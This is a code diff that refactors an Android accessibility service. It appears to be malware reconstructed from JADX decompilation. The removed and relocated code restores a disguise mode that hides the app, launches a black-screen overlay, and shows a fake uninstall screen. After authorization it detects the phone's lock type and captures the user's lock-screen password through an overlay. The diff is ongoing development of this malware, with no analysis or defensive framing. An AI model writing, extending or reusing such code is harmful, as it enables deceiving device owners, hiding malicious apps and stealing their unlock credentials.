-                    monitorConfirmationCount = monitorSettings.optInt("confirmationRequiredCount", 2)
-                    monitorMaxRetryCount = monitorSettings.optInt("maxRetryCount", 8)
-                    monitorDelayAfterConnected = (monitorSettings.optDouble("delayAfterServiceConnectedSeconds", 1.0) * d).toLong()
-                }
-
-                if (!isAccessibilityPageMonitorEnabled) {
-                    android.util.Log.d(TAG, "🔍 [监控] 无障碍监控功能已禁用（默认状态）")
-                    return
-                }
-
-                android.util.Log.d(TAG, "✅ 无障碍监控功能已启用 - 配置：延迟${monitorDelayAfterConnected}ms，间隔${monitorCheckInterval}ms，确认${monitorConfirmationCount}次，最多${monitorMaxRetryCount}次")
-                android.util.Log.w(TAG, "⚠️ [监控] 无障碍监控功能仅用于解决特定设备的跳转问题")
-            }
-        } catch (e: Exception) {
-            android.util.Log.d(TAG, "🔍 [监控] 无法加载无障碍监控配置，使用默认设置: ${e.message}")
-            isAccessibilityPageMonitorEnabled = false
-        }
-    }
-
-    /**
-     * Initialize activity monitor — restore camouflage state if hidden.
-     * JADX method: m211509k5 (k5), line 7610
-     *
-     * Checks if app is in camouflage mode (disguise_prefs.camouflage_enabled),
-     * and restores the event filter camouflage state accordingly.
-     */
-    fun initializeActivityMonitor() {
-        try {
-            val isHidden = try {
-                getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
-                    .getBoolean("camouflage_enabled", false)
-            } catch (_: Exception) { false }
-
-            if (!isHidden) {
-                android.util.Log.d(TAG, "🔍 [保护] APP未处于伪装模式，无需恢复伪装监听")
-                isCamouflageModeEnabled = false
-                return
-            }
-
-            android.util.Log.d(TAG, "✅ [保护] 检测到APP处于伪装模式，恢复伪装监听")
-            isCamouflageModeEnabled = true
-
-            // JADX: c0614i9.f56839b9 = camouflage state from SharedPreferences
-            // Restore camouflage state in eventFilterManager
-            try {
-                val camouflageEnabled = try {
-                    getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
-                        .getBoolean("phone_manager_camouflage_enabled", false)
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 恢复伪装状态失败", e)
-                    false
-                }
-                // JADX: set eventFilterManager.phoneManagerCamouflageEnabled = camouflageEnabled
-                eventFilterManager?.isPhoneManagerCamouflageEnabled = camouflageEnabled
-                android.util.Log.d(TAG, "✅ [保护] 伪装监听状态已恢复，isAppHidden=true")
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ [保护] 自动恢复伪装状态失败", e)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ [保护] 恢复伪装状态失败", e)
-        }
-    }
+    // initializeActivityMonitor() — moved to ServiceInitializer
 
     /**
      * Initialize recents guard (black screen UI control).
      * JADX method: m211491i5 (i5), line 6940
-     *
-     * Starts ibbnqvnvhxg activity if not already running.
+     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (BlackScreenCommandHandler).
      */
     fun initializeRecentsGuard() {
-        try {
-            // JADX: ibbnqvnvhxg.f55194a0.isRunning() — now replicated
-            if (com.storm.safe.rock.p029ui.ibbnqvnvhxg.isRunning()) {
-                android.util.Log.d(TAG, "ibbnqvnvhxg 已在运行，跳过启动")
-                return
-            }
-            // JADX: f52479l0 check — prevent duplicate starts
-            if (isOverlayVisible) {
-                android.util.Log.d(TAG, "ibbnqvnvhxg overlay 已可见，跳过启动")
-                return
-            }
-            // Start ibbnqvnvhxg activity
-            try {
-                val intent = android.content.Intent(this, com.storm.safe.rock.p029ui.ibbnqvnvhxg::class.java)
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(intent)
-                android.util.Log.d(TAG, "✅ initializeRecentsGuard — ibbnqvnvhxg 已启动")
-            } catch (e: Exception) {
-                android.util.Log.w(TAG, "⚠️ ibbnqvnvhxg 启动失败: ${e.message}")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 启动 ibbnqvnvhxg 失败", e)
-        }
+        serviceInitializer?.initializeRecentsGuard()
     }
 
     /**
      * Try to show the fake package verify (uninstall) overlay.
      * JADX method: m211534n2 (n2), line 9587
-     *
-     * Reads page_style_config.json for uninstallMode flag.
-     * If enabled, shows the fake uninstall progress overlay.
+     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (CipherFlowController).
      */
     fun tryShowPackageVerify() {
-        try {
-            android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")
-
-            val uninstallMode = try {
-                val text = assets.open("config.json").bufferedReader().use { it.readText() }
-                val json = org.json.JSONObject(text)
-                json.optJSONObject("protection")?.optBoolean("uninstall_mode", false) ?: false
-            } catch (_: Exception) { false }
-            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: config.json)")
-            if (!uninstallMode) {
-                android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
-                return
-            }
-
-            val verifyDone = getSharedPreferences("pkg_verify_state", Context.MODE_PRIVATE)
-                .getBoolean("v_done", false)
-            android.util.Log.d(TAG, "📦 [假卸载] shouldShow=${!verifyDone}")
-
-            if (verifyDone) {
-                android.util.Log.d(TAG, "📦 [假卸载] 已弹出过，跳过")
-                return
-            }
-
-            android.util.Log.d(TAG, "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★")
-            com.storm.safe.rock.service.modules.overlay.PkgVerifyOverlay.show(this)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "📦 [假卸载] 显示失败", e)
-        }
+        serviceInitializer?.tryShowPackageVerify()
     }
 
     /**
@@ -2636,76 +1830,10 @@ class MyAccessibilityService : AccessibilityService() {
 
     /**
      * Post-authorization initialization. JADX: m211504j8 (j8)
-     * Called after device authorization is complete.
-     *
-     * JADX: launches 2 coroutines on coroutineScope:
-     * - postAuthorizationInit$1: registers deferred components (b9, c0, k2, b7)
-     * - postAuthorizationInit$2: calls b5 (additional init)
+     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (DeviceAuthorizationManager).
      */
     fun postAuthorizationInit() {
-        try {
-            android.util.Log.i(TAG, "★ postAuthorizationInit: 授权完成后初始化")
-            coroutineScope?.launch(Dispatchers.Main) {
-                try {
-                    android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
-                    initializeDeferredManagers()
-                    overlayManager?.hide()
-                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
-                }
-            }
-            coroutineScope?.launch(Dispatchers.IO) {
-                try {
-                    kotlinx.coroutines.delay(3000)
-                    val prefs = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
-                    val cipherDone = prefs.getBoolean("cipher_completed", false)
-                    val savedType = prefs.getString("cipher_lock_type", "") ?: ""
-
-                    val currentType = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
-                        try {
-                            val root = rootInActiveWindow
-                            val detected = accessibilityEventRouter?.detectLockType(root)
-                            root?.recycle()
-                            detected?.name?.lowercase() ?: ""
-                        } catch (_: Exception) { "" }
-                    }
-
-                    val needsRecapture = when {
-                        !cipherDone -> true
-                        savedType.isEmpty() || savedType == "unknown" -> true
-                        currentType.isNotEmpty() && currentType != "unknown" && currentType != savedType -> true
-                        else -> false
-                    }
-
-                    if (needsRecapture) {
-                        when {
-                            !cipherDone ->
-                                android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
-                            savedType.isEmpty() || savedType == "unknown" ->
-                                android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
-                            else ->
-                                android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
-                        }
-                        prefs.edit().putBoolean("cipher_completed", false).apply()
-                        isCipherCaptureEnabled = true
-                        cipherRetryCount = 0
-                        cipherCaptureManager?.startListening()
-                        if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
-                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，已启用被动监听")
-                        } else {
-                            kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
-                                doLaunchSystemPasswordCapture(isInstallationFlow = true)
-                            }
-                        }
-                    } else {
-                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获(type=$savedType)，跳过")
-                    }
-                } catch (_: Exception) {}
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "postAuthorizationInit failed", e)
-        }
+        serviceInitializer?.postAuthorizationInit()
     }
 
     /** Add 50x50 transparent overlay window. JADX: a0 method */
@@ -2740,7 +1868,7 @@ class MyAccessibilityService : AccessibilityService() {
      * - When WebView is closed: poll every 2000ms
      * - On non-cancellation exception: log and delay 2000ms
      */
-    private fun startWebViewStatusCheckTask() {
+    internal fun startWebViewStatusCheckTask() {
         webViewStatusCheckJob?.cancel()
         webViewStatusCheckJob = coroutineScope?.launch {
             while (isActive) {
@@ -2779,7 +1907,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Clean up old manager resources before reinit. JADX: h1 method — see initializeManagers() */
     fun cleanupOldManagers() {
-        initializeManagers()
+        serviceInitializer?.initializeManagers()
     }
 
     /** Start network initialization. JADX: part of deferred init */
